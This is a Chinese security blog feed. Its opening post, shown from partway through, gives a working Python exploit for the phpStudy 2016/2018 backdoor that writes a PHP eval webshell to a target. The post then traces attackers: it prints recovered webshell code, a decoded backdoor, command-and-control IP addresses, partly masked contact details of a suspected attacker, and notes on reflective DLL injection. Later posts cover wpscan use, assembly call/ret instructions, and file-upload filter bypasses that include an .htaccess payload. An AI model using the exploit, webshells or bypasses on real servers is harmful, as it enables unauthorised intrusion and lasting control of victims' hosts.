(1)Python 编写Phpstudy2016 / 2018远程RCE利用脚本代码：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932321772.png" alt="" loading="lazy"></p>
<pre><code>import base64
import requests
print(
'''        ==============================================================================================                    &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;Phpstudy 2016/2018 远程 RCE Getshel工具&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;                    [+]By:艾登——皮尔斯                    [+]脚本仅用学习教育目的                    [+]请您务必遵守《中华人民共和国网络安全法》        ==============================================================================================        ''')
def write_shell(url,headers):
r = requests.get(url=url, headers=headers)
cheack_webshell = requests.get(url+&quot;/demon.php&quot;)
if cheack_webshell.status_code == 200:
print(&quot;\n\n[+]{}                Webshell写入成功&quot;.format(url))
else:
print(&quot;\n\n[+]{}                Webshell写入失败&quot;.format(url))
print(&quot;\n=======================================================\n\n&quot;)
while True:
path = input(str(&quot;请你输入绝对路径:&quot;))
url = input(str(&quot;请你输入IP地址/域名:&quot;))
payload_qury = &quot;&quot;&quot;system('ECHO ^&lt;?php @eval($_POST[cmd]); ?^&gt;&gt;&quot;{}/demon.php&quot;');&quot;&quot;&quot;.format(path)
payload = base64.b64encode(payload_qury.encode('utf-8'))
payload = str(payload, 'utf-8')
headers = {
'Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3','Accept-Language': 'zh-CN,zh;q=0.9','accept-charset': payload,'Accept-Encoding': 'gzip,deflate','Connection': 'close',}
write_shell(url=url, headers=headers)
</code></pre>
<p>(2)我们可以看到上面的这个Python复现phpstudy远程RCE的脚本针对于单一命令的phpstudy部署的站点例如这种界面额的还比较方便，如果我们不知道绝对路径是不是就不能写入webshell了?????其实这并不会!!!!</p>
<p>(3)针对于phpstudy指针页面无法访问的我们其实可以枚举一下他的物理路径地址即可，不知道绝地路径可以枚举一下物理的绝对理解</p>
<pre><code>Path=['C:/php/WWW',&quot;D:/php/WWW&quot;,&quot;E:/php/WWW&quot;........]
</code></pre>
<p>然后把列表中的绝地地址元素传入函数中递归请求判断即可，这里就不贴出代码了。</p>
<p>(4)与此同时各位老表在进行枚举检测，但是作为一个白帽子，千万不要越过红线。建议大家检测的时候不要写入一句话木马，直接写出一个phpinfo();比较好也是保护了自己。<br>
<strong>四、针对部署phpstudy环境服务器已被入侵的主机进行溯源分析:</strong><br>
(1)我在进行随机检测phpstudy的时候已经发现了部分感染主机被黑帽SEO利用了，用于增加搜索引擎关键词的排名来吸引流量。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932352223.png" alt="" loading="lazy"><br>
(2)部分检测到存在漏洞phpstudy服务器主机网站根目录下高频出现的php一句话木马文件名如下:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932358617.png" alt="" loading="lazy"><br>
(3)下面的这三位仁兄(大黑客)就是通过了echo的方式写入了webshell一句话木马到网站的根目录下进行链接，先放到一边后面在一起做后门取证。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932373575.png" alt="" loading="lazy"><br>
(4)另类的后门“lishunsheng.php”应该是一个人名的拼音，应该是李姓氏的<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932380920.png" alt="" loading="lazy"><br>
ZnB1dHMoZ**wZW4oJy4vdGVzdC5waHAnLCd3KycpLCc8P3BocCBldmFsKCRfUE9TVFtjXSk7Pz4nKTs=</p>
<p>(5)解密后<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932385721.png" alt="" loading="lazy"></p>
<pre><code>fputs(fopen('./test.php','w+'),'&lt;?php eval($_POST[c]);?&gt;');
</code></pre>
<p>(6)写出文件名为&quot;text.php&quot;链接密码为“c”的webshell一句话木马到网站根目录下方</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932390942.png" alt="" loading="lazy"><br>
(7)还有其他的黑客是通过phpmyadmin登录弱口令密码的系统日志文件写入webshell进来的<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932395954.png" alt="" loading="lazy"><br>
2019年9月23日17时30分33秒写入<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932400507.png" alt="" loading="lazy"><br>
2019年9月23日18时16分33秒写入webshell<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932408949.png" alt="" loading="lazy"><br>
(8)上面在9月23日写入webshell一句话后，大黑客又通过一句话木马webshell上传了一个文件名为“001122.php”的webshell不死马基本可以先贴个标签是同一个大黑客的攻击入侵行为，在这里也可以看出phpstudy一键部署应该把phpmyadmin的默认密码给修改成随机字符串，此前就有安全团队针对此问题被黑产批量getshell的活动进行了分析。<br>
<strong>五、针对部署phpstudy环境服务器已沦陷的主机进行溯源分析/黑客入侵画像</strong><br>
(1)我们现在已经拿到了那些黑客的的webshell一句话后门文件现在就要开始溯源黑客的IP地址，emmmmm，由于我不能直接登录受感染的主机查看访问日志文件，那么这就会非常的尴尬，但是我突然想起了之前我之前给广东省某市的网络执法机构做了一个用来记录黑客访问webshell一句话时候的IP地址的脚本，并且通过邮件或者微信把信息发送给执法人。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932415604.png" alt="" loading="lazy"><br>
(2)但是在检测之前我需要对他们的webshell一句话木马做一下加工处理，黑客原先留下的webshell代码如下:</p>
<pre><code>&lt;?php

@eval($_POST[ppass]);

?&gt;
</code></pre>
<p>(3)我们加工处理黑客留下的后的webshell代码如下</p>
<pre><code>&lt;?php

$address = $_SERVER['REMOTE_ADDR'];

$referer = $_SERVER['HTTP_REFERER'];

$browser = $_SERVER['HTTP_USER_AGENT'];

$file = fopen(&quot;log.html&quot;,  &quot;a&quot;);  

$time = time();

$now_date= date('Y-m-d H:i:s',$time);

fwrite( $file, &quot;&lt;b&gt;Time:$now_date&lt;/b&gt;&lt;br&gt;&quot; );

fwrite( $file, &quot;&lt;b&gt;IP Address:$address&lt;/b&gt;&lt;br&gt;&quot;);

fwrite( $file, &quot;&lt;b&gt;Referer:$referer&lt;/b&gt;&lt;br&gt;&quot;);  

fwrite( $file, &quot;&lt;b&gt;Browser:$browser&lt;/b&gt;&lt;br/&gt;&lt;hr&gt;&quot;);  

fclose($file);

@eval($_POST[ppass]);

?&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932422821.png" alt="" loading="lazy"><br>
(4)log.html的路径地址可以修改到存放到网站根目录下的其他文件下，避免被发现哈哈哈，</p>
<p>当黑客使用中国菜刀/中国蚁剑访问webshell的时候就会记录下IP地址/访问时间/请求头等信息到log.html文件中</p>
<p>(5)模拟黑客访问webshell前<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932428328.png" alt="" loading="lazy"><br>
(6)模拟黑客访问websell后<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932433179.png" alt="" loading="lazy"><br>
(7)然后本地或者VPS上定时访问请求log.html把最新的访问信息通过Email邮件的方式发送给执法机关/溯源工程师，<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932440617.png" alt="" loading="lazy"><br>
(8)访问检测已经可以达到了秒级，时间的精度也是非常之高。然后就给全部黑客的webshell加工一下，然后我们在调用本地的脚本使用一个并发的请求去请求所有的站点log.html静静等待邮件即可。但是这里并不建议并发请求容易被防火墙封锁IP，所以我就使用了单线线程模式并且使用tiime模块的time.sleep设置了请求延迟，我设置了10秒访问一次。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932449389.png" alt="" loading="lazy"><br>
(9)设置完毕之后就可以直接运行监听脚本了<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932455022.png" alt="" loading="lazy"><br>
(10)在经过十多个小时的等待,我终于等待到了那些大黑客重新访问他们预留下来的Webshell地址了，手机QQ邮箱也收到了邮件通知<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932471034.png" alt="" loading="lazy"><br>
(11)本次等待共获取到144条webshell访问记录，主要的访问IP地址如下:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932478190.png" alt="" loading="lazy"><br>
(12)此外我还注意到网站的根目录文件夹下方被上传了远程木马病毒(方便黑客后期长时间维持权限访问)如下图：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932485387.png" alt="" loading="lazy"><br>
<strong>那么接下来就是进行给黑客入侵画像：</strong><br>
<strong>(1)Windows7 64bit System 虚拟机样本未运行初始化状态</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932491344.png" alt="" loading="lazy"><br>
(2)执行cd.exe程序后本地端口49189端口被占用，链接的外部C&amp;C的上线地址:114.67.65.156:8081</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932498069.png" alt="" loading="lazy"><br>
(3)查壳:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932505182.png" alt="" loading="lazy"><br>
<strong>UPX压缩壳使用C++编写的win32木马程序</strong></p>
<p><strong>火绒剑分析:</strong><br>
(1)运行后会删除自身文件(cd.exe)并且会复制自身到C:\Windows下方<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932521335.png" alt="" loading="lazy"></p>
<pre><code>C:\Windows\system32\cmd.exe&quot; /c del C:\Users\ADMINI~1\Desktop\cd.exe &gt; null
</code></pre>
<p>删除母体<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932529492.png" alt="" loading="lazy"><br>
写入木马文件到C:\Windows\目录下</p>
<p>(2)注册行为:修改了以下注册表以此降低Internet安全设置。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932541636.png" alt="" loading="lazy"><br>
(3)向网关地址发送数据包：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932549334.png" alt="" loading="lazy"><br>
(4)与114.67.65.156:8081C&amp;C上线服务器地址建立TCP通信链接<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932555222.png" alt="" loading="lazy"><br>
114.67.65.156主机3389端口开放(Windows主机无疑)<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932561148.png" alt="" loading="lazy"><br>
(5)开启了web服务80端口访问IP发现有一个网站<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932569605.png" alt="" loading="lazy"><br>
(6)发现是一个做SEO的泛微目录的站点，留意到网站上面留下了这个站长的微信二维码<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932588873.png" alt="" loading="lazy"><br>
微信号尾号为H****553YM</p>
<p>QQ:64****08</p>
<p>就先叫他53YM大黑客<br>
(7)纯真IP库查询IP的归属地指向了一家名为&quot;北京市 凯达永易科技(北京)有限公司&quot;的公司<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932595542.png" alt="" loading="lazy"><br>
去天眼查网站查询这家公司发现公司已注销<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932605318.png" alt="" loading="lazy"><br>
(8)然后我顺便去Google搜索了一下这个C&amp;C上线地址,发现已经有安全团队分析了类似样本</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932617274.png" alt="" loading="lazy"><br>
2018.exe 211.149.225.80:3313(大灰狼木马)</p>
<p>inJoin.ps1是一个远程注入工具该PowerShell脚本具有3个基本功能集：<br>
DLL注入<br>
DLL注入简单地定义为将DLL插入另一个进程的空间然后执行其代码的过程。以下是OpenSecurityResearch博客文章中对此过程进行简化的可视化视图：<br>
1.）将DLL反映性地加载到PowerShell进程中</p>
<p>远程或本地运行时，可以将DLL输出返回给用户。</p>
<p>DLL完成执行后，清理PS进程中的内存。</p>
<p>2.）将EXE反射性地加载到PowerShell进程中。</p>
<p>远程运行时无法将EXE输出返回给用户。如果需要远程输出，则必须使用DLL。如果在本地运行，则可以返回EXE输出。</p>
<p>DLL完成执行后，清理PS进程中的内存。</p>
<p>非常适合运行EXE的现有渗透测试工具，而无需触发过程监控警报。</p>
<p>3.）以反射方式将DLL注入到远程进程中。</p>
<p>在远程或本地运行时，无法将DLL输出返回给用户。</p>
<p>如果DLL完成执行，则不清理远程进程中的内存。</p>
<p>非常适合通过将后门DLL注入另一个进程内存来在系统上植入后门。</p>
<p>期望DLL具有此功能：void VoidFunc（）。这是在DLL加载后将被调用的函数。</p>
<p>如果通俗点用人话来讲就是利用PowerShell来远程注入DLL的脚本</p>
<p>此PowerShell项目的Github项目地址:</p>
<pre><code>https://github.com/clymb3r/PowerShell
</code></pre>
<p>此PowerShell项目作者的说明：</p>
<pre><code>https://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932627565.png" alt="" loading="lazy"><br>
这里的江西赣州的黑客所使用的就是上图红圈选圈中的PowerShell脚本</p>
<p>然后查看他一下他的PowerShell脚本<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932640308.png" alt="" loading="lazy"><br>
其中$InputString是黑客把自己的恶意的二进制文件通过Base64转写后的字符串信息</p>
<pre><code>在通过PowerShell[System.Convert]::FromBase64String的方法是为上面二进制文件加密的字符串信息进行解密执行
</code></pre>
<p>InputString中Base64编码的字符串解密还原后为Metasploit生成的二进制文件。</p>
<p>PowerShell还原解密方式:</p>
<pre><code>$Base64Bytes = Get-Content (base64.txt)
$PEBytes= [System.Convert]::FromBase64String($Base64Bytes)
Set-Content calc.exe -Value $PEBytes
</code></pre>
<p>C#还原解密方式：</p>
<pre><code>using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
namespace test1
{
class Program
{
static void Main(string[] args)
{
byte[] AsBytes = File.ReadAllBytes(@&quot;C:\test\base64.txt&quot;);
String AsBase64String = Convert.FromBase64String(AsBytes);
StreamWriter sw = new StreamWriter(@&quot;C:\test\calc.exe&quot;);
sw.Write(AsBase64String);
sw.Close();
}
}
}
</code></pre>
<p>这个江西赣州的黑客够专业我喜欢<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932652689.png" alt="" loading="lazy"><br>
inJoin.ps1 上线地址为117.21.224.222:9898</p>
<p>木马文件名及上线地址如下图所示：</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932661253.png" alt="" loading="lazy"><br>
修复建议:<br>
1.前往官网下载phpstudy下载最新版本</p>
<p>2.修改服务器密码，检查系统日志文件，下载安装火绒杀毒软件进行全盘查杀病毒后门，以防生产环境被入侵者留下后门</p>
<p>2.开发人员应该尽量在生产环境中杜绝使用一键部署类型的软件和脚本防止软件留有后门，导致服务器病毒木马入侵</p>
<p>3.关注多一些风险预警平台&quot;微步&quot;/或者关注威胁情报收集的微信公众号&quot;黑鸟&quot;还有就是我的winway-鱼蛋师傅的漏洞挖掘公众号&quot;快识&quot;。</p>
<p>参考:<br>
<strong>phpStudy后门简要分析：</strong></p>
<p>http://www.freebuf.com/others-articles/215406.html</p>
<p>数十万PhpStudy用户被植入后门，快来检测你是否已沦为“肉鸡”！:</p>
<p>https://www.freebuf.com/news/topnews/214912.html</p>
<p>杭州警方通报打击涉网违法犯罪暨'净网2019'专项行动战果</p>
<p>https://mp.weixin.qq.com/s/s-5cVTxIJcDfdRjtnEnI0g</p>
<p>病毒团伙利用phpStudy RCE漏洞批量抓鸡，下发四个远控木马</p>
<p>https://www.4hou.com/system/20637.html</p>
<p>渗透技巧——通过cmd上传文件的N种方法</p>
<p>https://wooyun.js.org/drops/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87cmd%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84N%E7%A7%8D%E6%96%B9%E6%B3%95.html<br>
本文作者：艾登——皮尔斯， 属于FreeBuf原创奖励计划，未经许可禁止转载，这里我只是借来参考一下</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[wpscan]]></title>
        <id>https://jinqipiaopiao.github.io/post/wpscan/</id>
        <link href="https://jinqipiaopiao.github.io/post/wpscan/">
        </link>
        <updated>2021-11-02T12:01:25.000Z</updated>
        <content type="html"><![CDATA[<p>首先得去官网申请api-token值（不然就会报以下的错）<br>
[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.<br>
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</p>
<p>然后当你有了token值之后你就可以用命令行后面直接加api-token值即可<br>
如：</p>
<pre><code>先更新wpscan --update然后就可以使用了如果出现报错就说明是凯莉有问题换一个镜像就好了    
wpscan --url http://219.153.49.228:49425/ --api-token *****
</code></pre>
<p>当扫描出现红色的结果的时候说明就是扫描结束也即成功<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635855185383.png" alt="" loading="lazy"></p>
<p>然后接下来就是把结果拷贝到word里面直接找CVE然后利用漏洞</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[汇编语言]]></title>
        <id>https://jinqipiaopiao.github.io/post/hui-bian-yu-yan/</id>
        <link href="https://jinqipiaopiao.github.io/post/hui-bian-yu-yan/">
        </link>
        <updated>2021-10-27T01:57:35.000Z</updated>
        <content type="html"><![CDATA[<p><strong>call与ret</strong></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635299906733.png" alt="" loading="lazy"><br>
ax=6    (因为只跳了一次)<br>
<strong>1、call + 标号</strong></p>
<p>这个指令是先将call + 标号的下一条语句的IP放入栈中，然后使当前的IP+16位位移</p>
<p>看到上面的解释会让你想到什么？会想到jmp指令吧，jmp有个指令格式是：jmp near ptr 标号，这里的call唯一这种jmp多的一步就是多了一次入栈操作；</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635299950672.png" alt="" loading="lazy"><br>
ax=1000+9*2 (跳了两次)<br>
<strong>2、call far ptr + 标号</strong></p>
<p>这个指令是先将call指令的下一个指令的代码段地址入栈，再把call下一条指令的偏移地址入栈，然后使其跳到标号所在处</p>
<p>这又会让你想到什么？还是jmp指令，jmp指令的： jmp far ptr 标号， 这种jmp的使用是在段间转移的，这种call和jmp的区别就是多了两次入栈的操作；</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635299988485.png" alt="" loading="lazy"><br>
<strong>3、call + 16位寄存器</strong></p>
<p>这个指令先将call的下一条指令的IP入栈，然后再以ax为IP的代码处</p>
<p>这还是会想到jmp指令：jmp + 16位寄存器，这里的call唯一比jmp多的一步就是多了一步入栈操作；</p>
<p>再来：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635300241997.png" alt="" loading="lazy"><br>
<strong>4、call word ptr + 内存单元地址(sp的值因为是一个字也就是两个字节所以应该减2)</strong></p>
<p>这个指令的是先将call指令的下一条指令的IP入栈，然后跳到以内存单元地址为IP的代码处</p>
<p>这里同样还是会联想到jmp指令的：jmp word ptr + 内存单元地址，这里的call比jmp多的一步同样是入栈的操作；</p>
<p>最后的：</p>
<p><strong>5、call dword ptr + 内存单元地址(sp的值因为是2个字也就是4个字节所以应该减4)</strong></p>
<p>这个指令先将call指令的下一条指令的CS入栈，再将call指令的下一条指令的IP入栈，然后跳到以内存单元的高位为CS，低位为IP的代码处</p>
<p>这里还是会想到jmp指令：jmp dword ptr + 内存单元地址，这里的call和jmp的区别还是多了入栈的操作</p>
<p>综上所述：</p>
<p><strong>call指令：</strong></p>
<p>第一步：先将call指令的下一条指令的CS和IP入栈（当然如果是段间转移就要将CS和IP入栈，如果是段内转移就只要将IP入栈）</p>
<p>第二步：就是操作与call对应的jmp指令</p>
<p>所有的call指令都是可以用上面的两步来确定的，这是个通用的法则。</p>
<p><strong>ret和retf</strong></p>
<p>ret指令用栈中的数据，修改IP的内容，从而实现近转移；</p>
<p>retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。</p>
<p>CPU执行ret指令时，进行下面的两步操作：</p>
<p>（1）(IP) = ((ss)*16 +(sp))</p>
<p>（2）(sp) = (sp)+2</p>
<p>CPU执行retf指令时，进行下面四步操作：</p>
<p>（1）(IP) = ((ss)*16) + (sp)</p>
<p>（2）(sp) = (sp) + 2</p>
<p>（3）(CS) = ((ss)*16) + (sp)</p>
<p>（4）(sp) = (sp) + 2</p>
<p>用汇编语法来解释ret和retf指令，则：</p>
<p>CPU执行ret指令时，相当于进行：</p>
<p>pop IP</p>
<p>CPU执行retf指令时，相当于进行：</p>
<p>pop IP</p>
<p>pop CS<br>
————————————————<br>
版权声明：本文为CSDN博主「轩落_翼」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/qq_23880193/article/details/42317797</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[浅谈文件上传漏洞]]></title>
        <id>https://jinqipiaopiao.github.io/post/qian-tan-wen-jian-shang-chuan-lou-dong/</id>
        <link href="https://jinqipiaopiao.github.io/post/qian-tan-wen-jian-shang-chuan-lou-dong/">
        </link>
        <updated>2021-10-10T01:12:36.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x00-文件上传漏洞描述">0x00 文件上传漏洞描述</h1>
<p><strong>漏洞原理：</strong><br>
由于程序员在编写代码时候在对用户文件上传功能实现代码上没有严格限制用户上传的文件后缀以及文件类型或者处理缺陷,而导致用户可以越过其本身权限向服务器上上传可执行的动态脚本文件，简单的来说就是服务器端没有对客户端上传的文件进行严格验证或过滤,用户可以上传一个可执行的脚本文件,并通过此脚本获得了执行服务器端命令的能力而引发危害。<br>
<strong>漏洞危害：</strong><br>
1.针对上传功能的Dos攻击<br>
2.使上传文件在服务器上作为脚本执行<br>
3.诱使用户下载恶意文件<br>
4.越权下载文件</p>
<p>一切可以上传文件的位置皆可能存在文件上传漏洞！</p>
<p><strong>0x01 漏洞的绕过技术总结</strong><br>
首先将绕过分为前端绕过与后端绕过</p>
<p>1）前端绕过：</p>
<p>指数据上传后为提交到服务器，而是由于网站页面的js对其进行过滤，确认是否可以上传,删除限制上传js规则即可</p>
<p>2）后端绕过：</p>
<p><strong>黑名单：</strong></p>
<p>1.特殊解析后缀绕过</p>
<p>2.htaccess解析绕过</p>
<p>3.大小写绕过</p>
<p>4.点绕过</p>
<p>5.空格绕过</p>
<p>6.::$$DATA数据流绕过</p>
<p>7.配合解析绕过</p>
<p>8.双后缀解析绕过</p>
<p><strong>白名单：</strong><br>
1.MIME绕过<br>
2.%00截断<br>
3.0x00截断<br>
4.0x0a截断</p>
<p><strong>其他类型：</strong></p>
<p>1.条件头检测</p>
<p>2.二次渲染</p>
<p>3.条件竞争</p>
<p>4.突破getimagesize</p>
<p>5.突破exif_imagetype</p>
<p><strong>0x02 黑名单，白名单漏洞绕过技术案例</strong><br>
<strong>黑名单绕过</strong><br>
<strong>1）黑名单-特殊解析后缀绕过-upload-labs-03</strong><br>
黑名单限制php上传，但apache对php3.php5.phtml等也可以直接解析为php，故可将php后缀改为php3等，如果上传成功.php3,如果Apache不能解析，在Apache的配置文件httpd.conf文件中添语句php3即可</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633828436455.png" alt="" loading="lazy"><br>
上传即可，若解析不超过可能是apache版本过高</p>
<p><strong>2)黑名单-.htaccess解析绕过-upload-labs-04</strong><br>
htaccess文件一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。<br>
.htaccess：apache拓展配置文件，可以与解析文件在同一个目录</p>
<p>故我们可以先上传htaccess文件，重新命名解析规则，只针对当前目录下<br>
首先上传htaccess内容为</p>
<pre><code>none
&lt;IfModule mime_module&gt;
SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行
&lt;/IfModule&gt;
</code></pre>
<p>或<br>
AddType application/x-httpd-php .jpg  #将当前目录下jpg文件当作php运行<br>
再上传写入php的图片即可</p>
<p><strong>3）黑名单-大小写绕过-upload-labs-05</strong><br>
代码未过滤大小写，导致Php可上传后任可解析为php</p>
<p>** 4）黑名单-加点绕过-upload-labs-07**<br>
在windows中一个文件的后缀加上一个点与原来的后缀没有区别，从而用来文件上传绕过</p>
<p><strong>5）黑名单-空格绕过-upload-labs-06</strong><br>
由于没有对文件后缀名进行去空，因此可以在后缀名加空格绕过，文件属性不会变</p>
<p><strong>6）黑名单- ::$$DATA数据流绕过-upload-labs-08</strong><br>
在php+windows的情况下：如果文件名+”::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">“</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">把</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA“会把::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord">“</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">把</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">“</mi><mi mathvariant="normal">之</mi><mi mathvariant="normal">前</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">例</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">：</mi><mn>1.</mn><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA“之前的文件名。
例如：1.php::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord">“</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">：</span><span class="mord">1</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>$DATA<br>
<strong>1) 黑名单-配合解析绕过 upload-labs-9</strong><br>
由于代码对文件名最后是进行拼接的，可以伪造文件名<br>
代码先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar函数来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过或者为</p>
<p><strong>8）黑名单-双后缀解析 upload-labs-10</strong><br>
由于代码函数逻辑原因，1.pphphp 最后经过函数过滤完又恢复为1.php从而绕过。具体还是要代码审计，查找配合解析漏洞</p>
<p><strong>白名单绕过</strong></p>
<p><strong>1）白名单-MIME绕过-uplod-labs-02</strong><br>
MIME即为Content-Type: image/gif 在有些时候对MIME有过滤，即可将允许上传文件MIMEcopy给要上传的文件属性，从而实现绕过</p>
<p><strong>2）白名单-%00截断-upload-labs–11</strong><br>
截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态<br>
%00截断用在数据包的文件url地址上面，在url地址文件地址后加上阶段即可</p>
<p>例：/upload/1.php%00 使拼接无法实现 原来图片包含文件内容将写入1.php ，访问1.php即可</p>
<p><strong>3）白名单-0x00截断-upload-labs-12</strong><br>
save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。<br>
由于get请求会对一些字符自动解码，而在post传递，不会对字符解码，故需要我们自己转换<br>
这种截断不同于%00，它是在数据包中间的文件地址，文件名后截断</p>
<p><strong>4）白名单-0x0a截断-</strong><br>
换行 代码：LF ASCII码：/ n ，十六进制，0x0a，换行至下一行行首起始位置</p>
<p><strong>0x03 其他类型绕过</strong><br>
1）文件头检测绕过<br>
图片文件以字符展示出来时候，每一种格式的图片的前几个字符是固定，或者是数据包里面的Content-Type类型修改，从而绕过上传</p>
<p><strong>2）二次渲染上传绕过-upload-labs-16</strong><br>
在我们将文件上传到服务器，有一些服务器会对上传的文件进行二次修改，以服务器的类型储存起来，但是文件的外表不会变化，文件的hex值会发生一些变化，在upload-16关，发现服务器对我们上传的问价进行二次渲染，当我们之前将一句话木马插入经过服务器储存后再次查看hex值发现很多地方的值发生改变，我们经过原图片hex值对比，发现会有不会改变的值，我们将木马插入到这一串不会改变的值的位置里面，从而实现上传webshell</p>
<p><strong>3）条件竞争绕过-upload-labs-17</strong><br>
竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。思路是首先上传一个php文件，当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
<p><strong>4）突破getimagesize 绕过-upload-labs-14</strong><br>
